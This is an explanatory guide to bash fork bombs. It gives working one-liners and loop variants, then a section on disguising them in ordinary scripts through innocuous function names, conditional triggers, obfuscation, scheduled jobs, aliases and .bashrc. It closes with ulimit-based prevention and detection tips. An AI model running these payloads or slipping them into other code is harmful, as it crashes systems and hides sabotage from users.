## 💣 Fork Bombs

A **fork bomb** is a type of denial-of-service (DoS) attack against a computer system, 
designed to quickly **exhaust system resources** (especially process table entries and 
CPU cycles) by **repeatedly replicating itself**.

## 🔁 How it Works:

A fork bomb exploits the `fork()` system call, which is used to create new processes. 
A fork bomb creates a process that **continually spawns child processes**, each of which 
also spawns more processes, and so on — leading to **exponential growth**.

Eventually, the system is overwhelmed by thousands (or millions) of processes, making 
it unusable until it's rebooted.

## 💥 Example in Bash:
This seemingly cryptic line is one of the most well-known fork bombs in Unix-like systems.
```bash
:(){ :|:& };:
```

## Breakdown:

`:()` defines a function named `:`.

`{ :|:& };` tells the function to call itself (`:`), pipe its output into another call to itself (`:`), and run the result in the background (`&`).

The final `:` invokes the function, starting the explosion.

## 🚫 Why It’s Dangerous:

It can **crash** or **freeze** a system, especially if the user has high privileges.

On multi-user systems, it can affect everyone.

It’s often used as a prank or malicious payload, and in many environments, running it can get you banned or disciplined.

## 🔒 Prevention:
Limit the number of processes a user can spawn using `ulimit` (Linux):
```bash
ulimit -u 100
```
Use security policies or containers to isolate and restrict resource access.

> ⚠️  **Note:** Fork bombs are **dangerous**. They should only be studied in secure, isolated environments (e.g., virtual machines). Never run them on production or shared systems.

---

## 🧨 Other Fork Bomb Variants

### 1. Using `while` Loops

```bash
while true; do
  bash $0 &
done
```
This tells the current script to run itself in the background endlessly. It’s straightforward and dangerous.
---

### 2. Using `&` in a Loop with `()`:

```bash
( : & ) &
```
Put this inside a loop, or create multiple copies of it, and you get exponential forking behavior:
```bash
while true; do ( : & ) & done
```
### 3. Recursion Without a Function
```bash
bash -c 'bash -c "bash -c ..."' &
```
This can be stacked a few times and backgrounded to mimic a fork bomb with layers of process spawning.
---

## 🕵️  Sneaky Injections into Legit Bash Scripts
Here’s where things get more insidious. A fork bomb could be **obfuscated** or **embedded** in a way that makes it less obvious:

### ✅ Disguised Function Name
```bash
load_env(){ load_env|load_env & }; load_env
```
Looks like a regular `load_env` setup function — but it's a fork bomb.
---

### ✅ Hidden in Logic
```bash
initialize() {
  if [ "$1" == "--start" ]; then
    :(){ :|:& };:
  fi
}
```
Called only with a specific argument, making it seem safe unless someone passes ``--start``.
---

## ✅ Packed with Whitespace and Noise
```bash
: ( ) {     : |   : & } ; :
```
Or even:
```bash
function oOoOoO(){ oOoOoO|oOoOoO& }; oOoOoO
```
Unusual formatting or naming makes it hard to recognize.
---

## ✅ Nested Inside Subshells
```bash
(
  fork_loop() { fork_loop | fork_loop & }; fork_loop
) &
```
Running inside a subshell can make the behavior seem isolated — until it's not.
---

## ✅ Buried in a Scheduled Task
```bash
echo ":(){ :|:& };:" | at now + 1 minute
```
The fork bomb only triggers later, making it harder to trace.
---

## ✅ Hidden via Aliases or Script Inclusions
```bash
alias update=':(){ :|:& };:'
```
Or inside a common sourced script (like `.bashrc`, `.bash_profile`, etc.).
---

## 🧯 How to Detect / Defend

* Use `ulimit` to restrict how many processes users can run.

* **Review scripts carefully** for unusual function definitions or excessive recursion.

* **Monitor for sudden process spikes** using tools like `htop` or `top`.

* **Check** `.bashrc`, `.profile`, **and cron jobs** for anything unexpected.
